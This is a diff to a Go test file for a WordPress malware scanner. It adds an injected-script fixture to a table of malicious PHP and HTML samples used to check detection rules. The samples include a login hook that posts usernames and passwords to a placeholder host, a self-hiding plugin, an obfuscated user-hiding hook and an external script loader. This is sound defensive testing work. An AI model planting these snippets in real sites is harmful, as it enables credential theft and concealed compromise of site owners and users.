@@ -563,6 +563,7 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		"plugins/x/hide2.php":            {"<?php function g() { global $wp_list_table; foreach ($wp_list_table->items as $k => $v) { if ($k === 'x/x.php') { unset($wp_list_table->items[$k]); } } } add_action('pre_current_active_plugins', 'g');", "plugin-self-hiding"},
 		"plugins/x/ioc.php":              {"<?php $u = 'https://badping.info/SMILODON/index_logg.php?view=1';", "smilodon-toolkit-iocs"},
 		"plugins/x/stealer.php":          {"<?php add_action('wp_login', function ($login, $user) { $pwd = $_POST['pwd']; wp_remote_post('https://example.invalid/l', array('body' => array('u' => $login, 'p' => $pwd))); }, 10, 2);", "login-hook-credential-exfil"},
+		"themes/t/inject.html":           {"<script>eval(String.fromCharCode(33,102))</script><input type=\"hidden\"><script src=\"https://pelsguck.com/js/maps.js\"></script>", "injected-script-loader-domains"},
 		"uploads/wp-security-helper.php": {"<?php add_action(\"\\160\\162\\x65\\137\\147\\145\\x74\\137\\x75\\163\\145\\162\\163\", 'hide');", "hidden-user-query-hook-escaped"},
 	}
 	for rel, c := range cases {
